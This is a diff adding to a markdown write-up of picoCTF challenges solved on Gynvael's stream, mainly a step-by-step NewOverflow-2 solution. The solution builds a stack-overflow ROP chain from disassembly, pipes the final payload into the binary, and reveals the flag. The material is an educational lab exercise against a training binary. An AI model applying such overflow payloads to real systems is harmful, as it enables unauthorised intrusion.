@@ -1297,7 +1297,7 @@ picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_72d3e39f}
 Segmentation fault (core dumped)
 ```
 
-For some reason the program was crashing on the `push rbp` instruction (probably due to stack alignment).  
+For some reason the program was crashing on the `push rbp` instruction (probably due to stack alignment). Later Gynvael says that Canonical compiled the new Ubuntu kernel with some flags that would make a program crash if the stack was misaligned.  
 
 ## like1000 - Forensics
 Gynvael fails figure out how to use 7zip, then proceeds to try extracting the tar with the following script: 
@@ -1544,6 +1544,247 @@ Program received signal SIGSEGV, Segmentation fault.
 eax            0x51e               1310
 ```
 The returned value is stored in eax per [calling conventions](https://www.agner.org/optimize/calling_conventions.pdf)
+
+## NewOverflow-2 - Binary Exploitation
+We see the call to gets() in the vuln() function is the vulnerability in the program once again.  
+
+The flag() function seems to be put in the program by mistake.
+```c
+void flag() {
+  char buf[FLAGSIZE];
+  FILE *f = fopen("flag.txt","r");
+  if (f == NULL) {
+    printf("'flag.txt' missing in the current directory!\n");
+    exit(0);
+  }
+
+  fgets(buf,FLAGSIZE,f);
+  printf(buf);
+}
+```
+In a real ctf, Gynvael says to just take the easiest approach and just call this function. 
+However, in the stream, Gynvael decides to call the win_fn() function since that's probably the intentional solution.
+```c
+void win_fn() {
+  char flag[48];
+  FILE *file;
+  file = fopen("flag.txt", "r");
+  if (file == NULL) {
+    printf("'flag.txt' missing in the current directory!\n");
+    exit(0);
+  }
+
+  fgets(flag, sizeof(flag), file);
+  if (win1 && win2) {
+    printf("%s", flag);
+    return;
+  }
+  else {
+    printf("Nope, not quite...\n");
+  }
+}
+```
+
+In order to use the win_fn() function, we need to set the global `win1` and `win2` variables to true.  
+
+We see that win1 can be set using the following function:
+```c
+void win_fn1(unsigned int arg_check) {
+  if (arg_check == 0xDEADBEEF) {
+    win1 = true;
+  }
+}
+```
+
+and win2 can be set using this function:
+```c
+void win_fn2(unsigned int arg_check1, unsigned int arg_check2, unsigned int arg_check3) {
+  if (win1 && \
+      arg_check1 == 0xBAADCAFE && \
+      arg_check2 == 0xCAFEBABE && \
+      arg_check3 == 0xABADBABE) {
+    win2 = true;
+  }
+}
+```
+
+We *could* actually pass the right arguments to the above functions and then call the functions to try and set the win1 and win2 global variables, but it's much easier to just skip the if cases and jump directly to the `win1 = true;` and `win2 = true;`.  
+
+Use the checksec tool to see what mitigations are in place in the binary:
+```console
+$ checksec --file=vuln
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols        FORTIFY  Fortified   Fortifiable  FILE
+Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   77 Symbols     No       0           3            vuln
+```
+`NX enabled` means that we can't execute anything on the stack, but there's no PIE/ASLR (addresses that we see in memory are the addresses that are used in memory). This means ROP (Return Oriented Programming) will probably have to be used.  
+
+Gynvael makes a ROP chain by looking at the asm. Gynvael uses IDA but you can use `objdump -d vuln` to get the asm also.  
+
+In the win_fn1() function we have this:
+```assembly
+0000000000400767 <win_fn1>:
+  400767: 55                    push   %rbp
+  400768: 48 89 e5              mov    %rsp,%rbp
+  40076b: 89 7d fc              mov    %edi,-0x4(%rbp)
+  40076e: 81 7d fc ef be ad de  cmpl   $0xdeadbeef,-0x4(%rbp)
+  400775: 75 07                 jne    40077e <win_fn1+0x17>
+  400777: c6 05 fb 08 20 00 01  movb   $0x1,0x2008fb(%rip)        # 601079 <win1>
+  40077e: 90                    nop
+  40077f: 5d                    pop    %rbp
+  400780: c3                    retq 
+```
+First we can just jump to the `movb   $0x1,0x2008fb(%rip)` which sets the win1 var to 1. This way we avoid having to set the parameters of the function.
+
+We'll have to make the stack look like this:
+```
+AAAAAAAAAAAAAAAA...  # First we have some padding so we can overflow the stack. We'll figure out how much later.
+0x400777             # After gets() is called and vuln() returns, execution will transfer to this address which is the address of the instruction that sets win1 to 1.
+0x4141414141414141   # There's a pop %rbp after win1 is set. We need 8 bytes of junk on the stack to pop off.
+ADDR                 # This is the address of what we want to execute next. We'll figure what address we want to chain in next.
+```
+
+In the asm of win_fn2() we see this for the last 4 instruction:
+```assembly
+  4007b4:  c6 05 bf 08 20 00 01  movb   $0x1,0x2008bf(%rip)        # 60107a <win2>
+  4007bb: 90                    nop
+  4007bc: 5d                    pop    %rbp
+  4007bd: c3                    retq
+```
+
+We want ADDR to be the address of the `movb   $0x1,0x2008bf(%rip)` instruction, since that sets the global win2 variable to 1. Now our exploit looks like this:
+```
+AAAAAAAAAAAAAAAA...  # First we have some padding so we can overflow the stack. We'll figure out how much later.
+0x400777             # After gets() is called and vuln() returns, execution will transfer to this address which is the address of the instruction that sets win1 to 1.
+CCCCCCCC             # There's a pop %rbp after win1 is set. We need 8 bytes of junk on the stack to pop off.
+0x4007b4             # This is the address of the instruction that sets win2 to 1.
+```
+
+After setting win2, we see a `pop %rbp`, just like the win_fn1() function. So we add some more junk data for that.
+```
+AAAAAAAAAAAAAAAA...  # First we have some padding so we can overflow the stack. We'll figure out how much later.
+0x400777             # After gets() is called and vuln() returns, execution will transfer to this address which is the address of the instruction that sets win1 to 1.
+CCCCCCCC             # There's a pop %rbp after win1 is set. We need 8 bytes of junk on the stack to pop off.
+0x4007b4             # This is the address of the instruction that sets win2 to 1.
+CCCCCCCC             # 8 bytes of junk for the pop rbp (doesn't matter what we put here, just needs to be 8 bytes)
+```
+Finally the `ret` in win_fn2() means we need an ADDR2 to return to:
+```
+AAAAAAAAAAAAAAAA...  # First we have some padding so we can overflow the stack. We'll figure out how much later.
+0x400777             # After gets() is called and vuln() returns, execution will transfer to this address which is the address of the instruction that sets win1 to 1.
+CCCCCCCC             # There's a pop %rbp after win1 is set. We need 8 bytes of junk on the stack to pop off.
+0x4007b4             # This is the address of the instruction that sets win2 to 1.
+CCCCCCCC             # 8 bytes of junk for the pop rbp (doesn't matter what we put here, just needs to be 8 bytes)
+ADDR2                # We want to take execution to this address next
+```
+
+Now that the exploit sets win1 and win2, all we need to do is call the win_fn() function to get our flag. We find that the address of win_fn() is 0x0000000004007be.  
+
+Make ADDR2 the address of win_fn()
+```
+AAAAAAAAAAAAAAAA...  # First we have some padding so we can overflow the stack. We'll figure out how much later.
+0x400777             # After gets() is called and vuln() returns, execution will transfer to this address which is the address of the instruction that sets win1 to 1.
+CCCCCCCC             # There's a pop %rbp after win1 is set. We need 8 bytes of junk on the stack to pop off.
+0x4007b4             # This is the address of the instruction that sets win2 to 1.
+CCCCCCCC             # 8 bytes of junk for the pop rbp (doesn't matter what we put here, just needs to be 8 bytes)
+0x4007be             # Address of win_fn() which prints the flag
+```
+
+Now all we have to do with the exploit is find how much padding we need to overflow the stack and get the return address overwritten with our address. The asm for vuln() shows this:
+```assembly
+00000000004008b2 <vuln>:
+  4008b2: 55                    push   %rbp
+  4008b3: 48 89 e5              mov    %rsp,%rbp
+  4008b6: 48 83 ec 40           sub    $0x40,%rsp
+  4008ba: 48 8d 45 c0           lea    -0x40(%rbp),%rax
+  4008be: 48 89 c7              mov    %rax,%rdi
+  4008c1: b8 00 00 00 00        mov    $0x0,%eax
+  4008c6: e8 65 fd ff ff        callq  400630 <gets@plt>
+  4008cb: 90                    nop
+  4008cc: c9                    leaveq 
+  4008cd: c3                    retq 
+```
+The `sub    $0x40,%rsp` tells us that 0x40 bytes is allocated on the stack for buf. This means that 0x40 bytes or 64 bytes of padding is needed to overflow the buffer. We also need an additional 8 bytes for the saved rbp that we need to overwrite before reaching the return address.
+
+We get this now:
+```
+64 A's               # 0x40 bytes or 64 bytes needed to overwrite the entire buffer
+BBBBBBBB             # 8 bytes of junk data needed to overwrite the saved rbp
+0x400777             # Address called when vuln() returns to the instruction that sets win1 to 1.
+CCCCCCCC             # There's a pop %rbp after win1 is set. We need 8 bytes of junk on the stack to pop off.
+0x4007b4             # This is the address of the instruction that sets win2 to 1.
+CCCCCCCC             # 8 bytes of junk for the pop rbp (doesn't matter what we put here, just needs to be 8 bytes)
+0x4007be             # Address of win_fn() which prints the flag
+```
+
+We just need to align all the addresses since they're 64-bit addresses:
+```
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+BBBBBBBB
+0x0000000000400777
+CCCCCCCC
+0x00000000004007b4
+CCCCCCCC
+0x00000000004007be             
+```
+
+Make the addresses little endian:
+```
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+BBBBBBBB
+\x77\x07\x40\x00\x00\x00\x00\x00
+CCCCCCCC
+\xb4\x07\x40\x00\x00\x00\x00\x00 
+CCCCCCCC
+\xbe\x07\x40\x00\x00\x00\x00\x00
+```
+
+Final Exploit (combine everything):
+```AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x77\x07\x40\x00\x00\x00\x00\x00CCCCCCCC\xb4\x07\x40\x00\x00\x00\x00\x00CCCCCCCC\xbe\x07\x40\x00\x00\x00\x00\x00```
+
+Pipe our exploit into the vuln program:
+```console
+$ echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x77\x07\x40\x00\x00\x00\x00\x00CCCCCCCC\xb4\x07\x40\x00\x00\x00\x00\x00CCCCCCCC\xbe\x07\x40\x00\x00\x00\x00\x00' | ./vuln
+Welcome to 64-bit. Can you match these numbers?
+Segmentation fault (core dumped)
+```
+
+It looks like the it didn't work. The stack is probably misaligned just like last time (NewOverflow-1). To align the stack, we can just put in the addresses to ret since ret's are the equivalent to nop (no operation) in return oriented programming.  
+
+Find the address of a ret:
+```
+$ objdump -d vuln | grep retq
+  4005de: c3                    retq   
+  4006b0: f3 c3                 repz retq 
+  4006e9: c3                    retq   
+  400729: c3                    retq   
+  40074a: c3                    retq   
+  400750: f3 c3                 repz retq 
+  400780: c3                    retq   
+  4007bd: c3                    retq   
+  40084c: c3                    retq   
+  4008b1: c3                    retq   
+  4008cd: c3                    retq   
+  400936: c3                    retq   
+  4009a4: c3                    retq   
+  4009b0: f3 c3                 repz retq 
+  4009bc: c3                    retq
+```
+
+Just use any of the above (excluding the `repz retq`). Gynvael decides to use the 0x40084c address. Put the address of the return in the exploit so that when a ret instruction is executed, the next item on the stack is the address of our ret and then it continues the chain. Here it's placed after the `BBBBBB`.:
+```AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x4c\x08\x40\x00\x00\x00\x00\x00\x77\x07\x40\x00\x00\x00\x00\x00CCCCCCCC\xb4\x07\x40\x00\x00\x00\x00\x00CCCCCCCC\xbe\x07\x40\x00\x00\x00\x00\x00```
+
+When we use the modified exploit, it works.
+```console
+$ echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x4c\x08\x40\x00\x00\x00\x00\x00\x77\x07\x40\x00\x00\x00\x00\x00CCCCCCCC\xb4\x07\x40\x00\x00\x00\x00\x00CCCCCCCC\xbe\x07\x40\x00\x00\x00\x00\x00' | ./vuln
+Welcome to 64-bit. Can you match these numbers?
+picoCTF{r0p_1t_d0nT_st0p_1t_535c741c}
+Segmentation fault (core dumped)
+```
+
+Some instructions need stack alignments of 16 bytes instead of 8 bytes, which is why we needed to add another return in our exploit. 
+
+## asm2 - Reverse Engineering
+
 
 ## Random other stuff Gynvael says about solving ctf challenges during the stream
 * He recommends kaitai struct for stegno challenges (Part 1: 46:39)
